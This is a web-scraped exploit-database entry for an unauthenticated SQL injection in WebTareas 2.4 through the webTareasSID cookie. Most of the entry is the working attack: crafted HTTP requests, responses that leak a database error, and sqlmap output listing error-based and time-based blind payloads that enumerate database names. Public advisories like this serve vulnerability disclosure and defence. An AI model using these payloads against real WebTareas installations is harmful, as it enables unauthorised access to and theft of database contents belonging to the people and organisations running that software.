---
title: WebTareas 2.4 SQL Injection (Unauthorised)
url: https://cxsecurity.com/issue/WLB-2023030063
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-31
fetch_date: 2025-10-04T11:10:53.451090
---

# WebTareas 2.4 SQL Injection (Unauthorised)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WebTareas 2.4 SQL Injection (Unauthorised)** **2023.03.30**  Credit:  **[Hubert Wojciechowski](https://cxsecurity.com/author/Hubert%2BWojciechowski/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: WebTareas 2.4 - SQL Injection (Unauthorised)
# Date: 15/10/2022
# Exploit Author: Hubert Wojciechowski
# Contact Author: hub.woj12345@gmail.com
# Vendor Homepage: https://sourceforge.net/projects/webtareas/
# Software Link: https://sourceforge.net/projects/webtareas/
# Version: 2.4
# Testeted on: Windows 10 using XAMPP, Apache/2.4.48 (Win64) OpenSSL/1.1.1l PHP/7.4.23
## Example
-----------------------------------------------------------------------------------------------------------------------
Param: webTareasSID in cookie
-----------------------------------------------------------------------------------------------------------------------
Req
-----------------------------------------------------------------------------------------------------------------------
GET /webtareas/administration/admin.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/webtareas/general/login.php?msg=logout
Connection: close
Cookie: webTareasSID=Mt%ezS%00%07contCtxNzS%00%06\_itemsVl%00%00%00%02S%00%03fooS%00%03barzzR%00%00%00%01Mt%001com.sun.org.apache.xpath.internal.objects.XStringS%00%05m\_objS%00%04%eb%a7%a6%0f%1a%0bS%00%08m\_parentNzR%00%00%00%12z''
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
-----------------------------------------------------------------------------------------------------------------------
Res:
-----------------------------------------------------------------------------------------------------------------------
HTTP/1.1 302 Found
Date: Sat, 15 Oct 2022 11:38:50 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
X-Powered-By: PHP/7.4.30
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ../service\_site/home.php?msg=permissiondenied
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
-----------------------------------------------------------------------------------------------------------------------
Req
-----------------------------------------------------------------------------------------------------------------------
GET /webtareas/administration/admin.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/webtareas/general/login.php?msg=logout
Connection: close
Cookie: webTareasSID=Mt%ezS%00%07contCtxNzS%00%06\_itemsVl%00%00%00%02S%00%03fooS%00%03barzzR%00%00%00%01Mt%001com.sun.org.apache.xpath.internal.objects.XStringS%00%05m\_objS%00%04%eb%a7%a6%0f%1a%0bS%00%08m\_parentNzR%00%00%00%12z'
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
-----------------------------------------------------------------------------------------------------------------------
Res:
-----------------------------------------------------------------------------------------------------------------------
HTTP/1.1 302 Found
Date: Sat, 15 Oct 2022 11:38:39 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
X-Powered-By: PHP/7.4.30
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ../service\_site/home.php?msg=permissiondenied
Content-Length: 355
Connection: close
Content-Type: text/html; charset=UTF-8
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'javax.naming.spi.ContinuaS' at line 1(1064)<br />
<b>Warning</b>: Unknown: Failed to write session data using user defined save handler. (session.save\_path: E:\xampp\_php7\tmp) in <b>Unknown</b> on line <b>0</b><br />
-----------------------------------------------------------------------------------------------------------------------
SQLMap:
-----------------------------------------------------------------------------------------------------------------------
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1\* ((custom) HEADER)
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: webTareasSID=Mt%00%00Mt%00%17com.caucho.naming.QNameS%00%08\_contextMt%00' AND (SELECT 7431 FROM(SELECT COUNT(\*),CONCAT(0x717a717071,(SELECT (ELT(7431=7431,1))),0x71716a7171,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)-- wBnB; qdPM8=grntkihirc9efukm73dpo1ktt5; PHPSESSID=nsv9pmko3u7rh0s37cd6vg2ko1
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: webTareasSID=Mt%00%00Mt%00%17com.caucho.naming.QNameS%00%08\_contextMt%00' AND (SELECT 7004 FROM (SELECT(SLEEP(5)))BFRG)-- Oamh; qdPM8=grntkihirc9efukm73dpo1ktt5; PHPSESSID=nsv9pmko3u7rh0s37cd6vg2ko1
[11:49:03] [INFO] testing MySQL
[11:49:03] [INFO] confirming MySQL
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[11:49:03] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.30, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[11:49:03] [INFO] fetching database names
[11:49:04] [INFO] starting 6 threads
[11:49:06] [INFO] retrieved: 'zxcv'
[11:49:06] [INFO] retrieved: 'information\_schema'
[11:49:06] [INFO] retrieved: 'performance\_schema'
[11:49:06] [INFO] retrieved: 'test'
[11:49:06] [INFO] retrieved: 'phpmyadmin'
[11:49:06] ...